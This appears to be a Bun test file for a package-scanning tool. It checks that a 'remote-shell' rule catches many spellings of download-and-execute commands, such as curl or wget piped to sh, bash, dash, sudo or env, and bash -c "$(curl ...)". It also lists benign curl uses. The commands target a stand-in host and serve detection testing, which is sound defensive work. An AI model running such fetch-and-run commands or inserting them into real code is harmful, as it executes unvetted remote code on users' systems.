// Download-and-run commands the remote-shell rule missed because of how they were written: a quoted URL, a shell named
// by its path or reached through env or sudo, dash, and the `sh -c "$(curl …)"` and `sh <(curl …)` forms. Each scored a
// clean 100. Payloads are harmless stand-ins (example.invalid).
import { describe, expect, test } from "bun:test";
import { analyze, finalize, SCORE_FLOOR, type AnalyzeInput, type TarEntry } from "../src/index.ts";

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

function scoreOf(cmd: string) {
  const manifest: AnalyzeInput["manifest"] = { name: "probe-pkg", version: "1.0.0", license: "MIT", main: "index.js" };
  const files = [entry("package.json", JSON.stringify(manifest)), entry("index.js", `require('child_process').execSync(${JSON.stringify(cmd)});\n`)];
  const r = finalize(analyze({ name: "probe-pkg", manifest, files, publisher: "a", previousPublishers: [] }), { publishedAt: 0, now: 1e12, deprecated: null, status: "active", statusReason: null });

  return { score: r.score, ids: r.signals.map((s) => s.id) };
}

const URL = "https://example.invalid/x.sh";

describe("a command that downloads a script and runs it is a remote shell however it is written", () => {
  test("the unquoted form is the baseline", () => {
    expect(scoreOf(`curl -fsSL ${URL} | sh`).ids).toContain("remote-shell");
  });

  for (const cmd of [
    `curl -fsSL "${URL}" | sh`,
    `curl '${URL}' | bash`,
    `curl -H "Accept: */*" ${URL} | bash`,
    `curl -s ${URL} | /bin/sh`,
    `curl -s ${URL} | /usr/bin/env bash`,
    `curl -fsSL ${URL} | sudo -E bash`,
    `wget -qO- '${URL}' | sudo -E -H bash -`,
    `curl -fsSL ${URL} | dash`,
    `bash -c "$(curl -fsSL ${URL})"`,
    `sh -c "\`curl -fsSL ${URL}\`"`,
    `bash <(curl -fsSL ${URL})`,
    `. <(curl -fsSL ${URL})`,
    `cd /tmp && . <(curl -fsSL ${URL})`,
    `curl -s ${URL} | env -i bash`,
    `curl -s ${URL} | sudo -u root bash`,
    `curl -s ${URL} | doas -u root /bin/sh`,
    `curl -s "${URL}?a=1&b=2" | sh`,
  ]) {
    test(cmd, () => {
      const r = scoreOf(cmd);

      expect(r.ids).toContain("remote-shell");
      expect(r.score).toBeLessThan(SCORE_FLOOR);
    });
  }
});

describe("commands that do not run what they download are not", () => {
  for (const cmd of [
    `curl -fsSL "${URL}" -o x.sh`,
    `curl -s "${URL}" | shasum -a 256`,
    `curl -fsSL "${URL}" || bash fallback.sh`,
    `curl -s "${URL}" | grep version`,
    // a pipe inside a quoted argument is part of the URL, not a pipe
    `curl "https://example.invalid/search?q=foo|sh"`,
    `curl -s 'https://example.invalid/a|bash' -o out.txt`,
    `curl -s "${URL}" | sudo tee /etc/app/x.sh`,
  ]) {
    test(cmd, () => {
      expect(scoreOf(cmd).ids).not.toContain("remote-shell");
    });
  }
});
